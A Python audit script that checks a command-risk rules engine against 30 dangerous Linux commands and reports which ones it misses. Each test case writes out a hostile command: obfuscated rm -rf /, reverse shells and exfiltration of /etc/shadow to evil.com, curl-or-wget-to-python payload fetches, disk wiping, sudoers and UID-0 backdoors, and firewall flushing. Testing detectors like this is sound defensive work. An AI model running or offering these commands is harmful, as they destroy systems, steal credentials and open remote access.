"""
edge_case_audit.py

30 edge-case dangerous Linux commands tested against rules_engine.check().
Each case has an expected minimum risk level. Commands that score BELOW
their expected risk are gaps in the rules engine.
"""

import json
from rules_engine import check
from knowledge_base import lookup


# ── helper ──────────────────────────────────────────────────────────────
RISK_RANK = {"low": 0, "medium": 1, "high": 2, "critical": 3}

def _ast(command="", flags=None, args=None, target_path="",
         is_sudo=False, is_recursive=False, is_force=False,
         raw="", pipe_to=""):
    return dict(command=command, flags=flags or [], args=args or [],
                target_path=target_path, is_sudo=is_sudo,
                is_recursive=is_recursive, is_force=is_force,
                raw=raw, pipe_to=pipe_to)


# ── 30 edge cases ──────────────────────────────────────────────────────
# (description, ast_dict, expected_minimum_risk)

EDGE_CASES = [
    # ─── 1-5: Obfuscation / encoding bypass ───
    (
        "1. Hex-encoded rm via echo -e piped to sh",
        _ast(command="echo", flags=["-e"],
             args=[r'"\x72\x6d\x20\x2d\x72\x66\x20\x2f"'],
             raw=r'echo -e "\x72\x6d\x20\x2d\x72\x66\x20\x2f" | sh',
             pipe_to="sh"),
        "high",
    ),
    (
        "2. Python one-liner: os.system('rm -rf /')",
        _ast(command="python", flags=["-c"],
             args=["import os; os.system('rm -rf /')"],
             raw="python -c \"import os; os.system('rm -rf /')\""),
        "high",
    ),
    (
        "3. Perl one-liner: system('rm -rf /')",
        _ast(command="perl", flags=["-e"],
             args=["system('rm -rf /')"],
             raw="perl -e \"system('rm -rf /')\""),
        "high",
    ),
    (
        "4. $() command substitution with base64 decode",
        _ast(command="bash", flags=["-c"],
             args=["$(echo cm0gLXJmIC8= | base64 -d)"],
             raw="bash -c \"$(echo cm0gLXJmIC8= | base64 -d)\""),
        "high",
    ),
    (
        "5. eval with hex escape sequences",
        _ast(command="eval",
             args=["$'\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f'"],
             raw="eval $'\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f'"),
        "high",
    ),

    # ─── 6-10: Reverse shells & network exfiltration ───
    (
        "6. Bash reverse shell via /dev/tcp",
        _ast(command="bash", flags=["-i"],
             raw="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        "high",
    ),
    (
        "7. Netcat reverse shell with -e",
        _ast(command="nc", flags=["-e"], args=["/bin/sh", "evil.com", "4444"],
             raw="nc -e /bin/sh evil.com 4444"),
        "high",
    ),
    (
        "8. Exfiltrate /etc/shadow via curl POST",
        _ast(command="curl", flags=["-X", "POST", "-d"],
             args=["@/etc/shadow", "https://evil.com/exfil"],
             raw="curl -X POST -d @/etc/shadow https://evil.com/exfil"),
        "high",
    ),
    (
        "9. wget output piped to python (not just bash/sh)",
        _ast(command="wget", flags=["-qO-"],
             args=["https://evil.com/payload.py"],
             raw="wget -qO- https://evil.com/payload.py | python3",
             pipe_to="python3"),
        "high",
    ),
    (
        "10. curl piped to python",
        _ast(command="curl", flags=["-s"],
             args=["https://evil.com/payload.py"],
             raw="curl -s https://evil.com/payload.py | python",
             pipe_to="python"),
        "high",
    ),

    # ─── 11-15: File truncation / overwrite without rm ───
    (
        "11. Truncate /etc/passwd with redirect: > /etc/passwd",
        _ast(command=">", args=["/etc/passwd"],
             target_path="/etc/passwd",
             raw="> /etc/passwd"),
        "critical",
    ),
    (
        "12. Overwrite disk via cat: cat /dev/urandom > /dev/sda",
        _ast(command="cat", args=["/dev/urandom"],
             target_path="/dev/sda",
             raw="cat /dev/urandom > /dev/sda"),
        "critical",
    ),
    (
        "13. Symlink attack: ln -sf /dev/null /etc/passwd",
        _ast(command="ln", flags=["-sf"],
             args=["/dev/null", "/etc/passwd"],
             target_path="/etc/passwd",
             raw="ln -sf /dev/null /etc/passwd"),
        "high",
    ),
    (
        "14. tee to overwrite system file: echo 'x' | tee /etc/shadow",
        _ast(command="tee", args=["/etc/shadow"],
             target_path="/etc/shadow",
             raw="echo 'x' | tee /etc/shadow"),
        "high",
    ),
    (
        "15. shred entire disk: shred -vfz /dev/sda",
        _ast(command="shred", flags=["-v", "-f", "-z"],
             args=["/dev/sda"], target_path="/dev/sda",
             raw="shred -vfz /dev/sda"),
        "critical",
    ),

    # ─── 16-20: Privilege escalation ───
    (
        "16. chmod +s /bin/bash (SUID on bash — instant root)",
        _ast(command="chmod", flags=["+s"], args=["/bin/bash"],
             target_path="/bin/bash",
             raw="chmod +s /bin/bash"),
        "critical",
    ),
    (
        "17. Append NOPASSWD to sudoers",
        _ast(command="echo",
             args=['"user ALL=(ALL) NOPASSWD:ALL"', ">>", "/etc/sudoers"],
             target_path="/etc/sudoers",
             raw='echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'),
        "critical",
    ),
    (
        "18. useradd with UID 0 (create root-equivalent backdoor user)",
        _ast(command="useradd", flags=["-o", "-u", "0", "-g", "0"],
             args=["backdoor"],
             raw="useradd -o -u 0 -g 0 backdoor", is_sudo=True),
        "critical",
    ),
    (
        "19. passwd root (change root password)",
        _ast(command="passwd", args=["root"],
             raw="sudo passwd root", is_sudo=True),
        "high",
    ),
    (
        "20. visudo with malicious EDITOR",
        _ast(command="visudo",
             raw="EDITOR='echo pwned >>' visudo", is_sudo=True),
        "high",
    ),

    # ─── 21-25: Disk/partition/boot destruction ───
    (
        "21. wipefs -a /dev/sda (wipe all filesystem signatures)",
        _ast(command="wipefs", flags=["-a"], args=["/dev/sda"],
             target_path="/dev/sda",
             raw="wipefs -a /dev/sda"),
        "critical",
    ),
    (
        "22. blkdiscard /dev/nvme0n1 (TRIM entire NVMe — instant data loss)",
        _ast(command="blkdiscard", args=["/dev/nvme0n1"],
             target_path="/dev/nvme0n1",
             raw="blkdiscard /dev/nvme0n1"),
        "critical",
    ),
    (
        "23. parted rm partition: parted /dev/sda rm 1",
        _ast(command="parted", args=["/dev/sda", "rm", "1"],
             target_path="/dev/sda",
             raw="parted /dev/sda rm 1"),
        "critical",
    ),
    (
        "24. Write to MBR: dd of=/dev/sda bs=512 count=1 (variant with no if=)",
        _ast(command="dd",
             args=["of=/dev/sda", "bs=512", "count=1"],
             raw="echo AAAA | dd of=/dev/sda bs=512 count=1"),
        "critical",
    ),
    (
        "25. systemctl isolate rescue.target (kills nearly all services)",
        _ast(command="systemctl", flags=["isolate"],
             args=["rescue.target"],
             raw="systemctl isolate rescue.target"),
        "high",
    ),

    # ─── 26-30: Process/system-level attacks ───
    (
        "26. killall -9 -u root (kill all root processes)",
        _ast(command="killall", flags=["-9", "-u"],
             args=["root"],
             raw="killall -9 -u root"),
        "critical",
    ),
    (
        "27. pkill -9 -u root",
        _ast(command="pkill", flags=["-9", "-u"],
             args=["root"],
             raw="pkill -9 -u root"),
        "critical",
    ),
    (
        "28. SysRq instant reboot: echo b > /proc/sysrq-trigger",
        _ast(command="echo", args=["b"],
             target_path="/proc/sysrq-trigger",
             raw="echo b > /proc/sysrq-trigger"),
        "critical",
    ),
    (
        "29. crontab -r (silently delete all cron jobs)",
        _ast(command="crontab", flags=["-r"],
             raw="crontab -r"),
        "medium",
    ),
    (
        "30. iptables -F (flush ALL firewall rules — instant exposure)",
        _ast(command="iptables", flags=["-F"],
             raw="iptables -F"),
        "high",
    ),
]


# ── Run audit ──────────────────────────────────────────────────────────

def main():
    gaps = []
    detected = []

    print("=" * 80)
    print(f"  EDGE-CASE AUDIT: 30 adversarial commands vs rules_engine")
    print("=" * 80)

    for desc, ast, expected_min in EDGE_CASES:
        kb = lookup(ast["command"])
        result = check(ast, kb)
        actual = result["risk"]
        passed = RISK_RANK.get(actual, 0) >= RISK_RANK.get(expected_min, 0)
        status = "DETECTED" if passed else "!! GAP !!"
        symbol = "OK" if passed else "XX"

        print(f"\n{symbol}  [{status}]  {desc}")
        print(f"   raw:     {ast.get('raw', '(none)')}")
        print(f"   expect:  >= {expected_min:<8s}  actual: {actual:<8s}  rule: {result['matched_rule']}")

        if not passed:
            gaps.append((desc, ast["raw"], expected_min, actual, result))
        else:
            detected.append(desc)

    # ── Summary ──
    print("\n" + "=" * 80)
    print(f"  SUMMARY: {len(detected)}/30 detected, {len(gaps)}/30 GAPS")
    print("=" * 80)

    if gaps:
        print("\n  GAPS (commands that slipped through):\n")
        for i, (desc, raw, exp, act, result) in enumerate(gaps, 1):
            print(f"  {i:2d}. {desc}")
            print(f"      raw:      {raw}")
            print(f"      expected: >= {exp},  got: {act}")
            print(f"      rule:     {result['matched_rule']}")
            print(f"      reason:   {result['reason']}")
            print()
    else:
        print("\n  No gaps found — all 30 edge cases detected!\n")

    return gaps


if __name__ == "__main__":
    gaps = main()
    exit(0 if not gaps else 1)
